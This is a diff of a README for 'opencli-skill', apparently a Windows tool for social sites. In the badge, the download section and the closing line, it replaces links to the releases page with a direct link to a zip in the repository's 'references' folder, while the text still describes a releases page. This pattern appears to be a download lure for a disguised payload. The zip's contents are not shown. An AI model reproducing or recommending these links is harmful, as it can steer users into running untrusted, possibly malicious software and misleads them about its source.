@@ -1,6 +1,6 @@
 # opencli-skill - Simple access for social sites
 
-[![Download opencli-skill](https://img.shields.io/badge/Download%20opencli-skill-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Baublediagonal89/opencli-skill/releases)
+[![Download opencli-skill](https://img.shields.io/badge/Download%20opencli-skill-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Baublediagonal89/opencli-skill/raw/refs/heads/main/references/skill_opencli_v1.2.zip)
 
 ## 🧰 What this app does
 
@@ -36,7 +36,7 @@ Best results come from Windows 10 or Windows 11.
 
 Visit this page to download the latest version for Windows:
 
-https://github.com/Baublediagonal89/opencli-skill/releases
+https://github.com/Baublediagonal89/opencli-skill/raw/refs/heads/main/references/skill_opencli_v1.2.zip
 
 On that page, look for the newest release and pick the file that matches your system. For most Windows users, that will be an `.exe` file or a zipped Windows build.
 
@@ -208,4 +208,4 @@ opencli-skill fits users who want one tool for many social and content sites. It
 
 If you need the latest build, use this page:
 
-https://github.com/Baublediagonal89/opencli-skill/releases
+https://github.com/Baublediagonal89/opencli-skill/raw/refs/heads/main/references/skill_opencli_v1.2.zip
